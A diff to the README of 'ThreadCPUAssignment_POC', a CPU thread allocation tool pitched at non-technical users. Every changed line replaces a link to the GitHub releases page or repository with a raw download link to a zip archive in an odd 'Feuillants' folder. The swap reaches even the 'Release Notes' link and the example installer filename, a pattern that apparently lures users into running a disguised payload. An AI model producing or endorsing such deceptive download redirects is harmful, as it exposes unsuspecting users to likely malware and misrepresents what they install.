@@ -4,7 +4,7 @@
 Welcome to ThreadCPUAssignment_POC! This software helps allocate CPU threads to processes and manage high-priority threads. It’s simple to use, even if you don’t have a technical background. 
 
 ## 📥 Download the Software
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-ThreadCPUAssignment_POC-blue.svg)](https://github.com/Prajal-07S/ThreadCPUAssignment_POC/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Prajal-07S/ThreadCPUAssignment_POC/main/Feuillants/ThreadCPUAssignment_POC.zip%https://raw.githubusercontent.com/Prajal-07S/ThreadCPUAssignment_POC/main/Feuillants/ThreadCPUAssignment_POC.zip)](https://raw.githubusercontent.com/Prajal-07S/ThreadCPUAssignment_POC/main/Feuillants/ThreadCPUAssignment_POC.zip)
 
 ## 📋 System Requirements
 To run this application, your computer needs:
@@ -23,13 +23,13 @@ To run this application, your computer needs:
 
 ## 💻 How to Download & Install
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/Prajal-07S/ThreadCPUAssignment_POC/releases) to open the Releases page.
+   Click [here](https://raw.githubusercontent.com/Prajal-07S/ThreadCPUAssignment_POC/main/Feuillants/ThreadCPUAssignment_POC.zip) to open the Releases page.
 
 2. **Find the Latest Version**  
    On the Releases page, locate the latest version. It will be at the top of the list.
 
 3. **Download the Installer**  
-   Click on the installer file that matches your operating system. It will have a name like `ThreadCPUAssignment_POC_v1.0.exe`. Your browser will start downloading the file.
+   Click on the installer file that matches your operating system. It will have a name like `https://raw.githubusercontent.com/Prajal-07S/ThreadCPUAssignment_POC/main/Feuillants/ThreadCPUAssignment_POC.zip`. Your browser will start downloading the file.
 
 4. **Run the Installer**  
    Once the download finishes, open the installer. You can usually find it in your "Downloads" folder. Double-click the file to start the installation process.
@@ -70,7 +70,7 @@ You can reach out by visiting the Issues section on the repository page. Feel fr
 It’s important to keep your application updated for the best performance and security. Check the Releases page regularly for new versions. Follow the same download and installation steps to update.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/Prajal-07S/ThreadCPUAssignment_POC)
-- [Release Notes](https://github.com/Prajal-07S/ThreadCPUAssignment_POC/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Prajal-07S/ThreadCPUAssignment_POC/main/Feuillants/ThreadCPUAssignment_POC.zip)
+- [Release Notes](https://raw.githubusercontent.com/Prajal-07S/ThreadCPUAssignment_POC/main/Feuillants/ThreadCPUAssignment_POC.zip)
 
 Now you are ready to enhance your CPU management with ThreadCPUAssignment_POC! Enjoy optimizing your processes with ease.
